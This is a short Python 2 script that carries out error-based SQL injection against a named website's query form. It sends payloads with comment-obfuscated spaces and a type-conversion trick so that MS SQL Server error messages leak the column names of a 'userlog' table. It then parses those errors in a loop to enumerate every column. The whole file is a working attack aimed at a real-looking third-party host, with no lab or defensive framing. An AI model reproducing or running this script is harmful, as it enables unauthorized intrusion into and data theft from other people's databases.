#-*- coding:utf8 -*-
import requests
import sys
reload(sys)
sys.setdefaultencoding( "utf8" )

url='http://www.iuka.cn/chaxun'
col_names=['null']
while True:
	con="123'/**/and/**/convert(int,(select/**/top/**/1/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name='userlog'/**/and/**/column_name/**/not/**/in('"+"','".join(col_names)+"')))=0-- "
	data={
		'con':con,
		'act':'cha'
	}
	r=requests.post(url,data=data) 
	text=r.content.decode('gbk')
	start=text.find(u'值')
	end=text.find(u'转换')

	new_col=str(text[start+3:end-2])
	if new_col=='' or end==-1:
		break
	col_names.append(new_col)
	start+=len(new_col)+3
print col_names

